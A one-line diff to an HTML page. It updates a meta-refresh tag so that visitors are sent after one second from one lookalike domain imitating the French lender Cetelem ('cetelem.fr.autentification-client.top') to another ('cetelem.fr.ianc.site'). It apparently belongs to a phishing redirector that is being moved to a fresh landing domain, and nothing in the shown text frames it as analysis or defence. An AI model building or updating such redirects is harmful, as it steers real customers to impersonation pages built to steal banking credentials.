@@ -1,1 +1,1 @@
-<meta http-equiv="refresh" content="1;URL=https://cetelem.fr.autentification-client.top/pages">
+<meta http-equiv="refresh" content="1;URL=https://cetelem.fr.ianc.site/pages/">
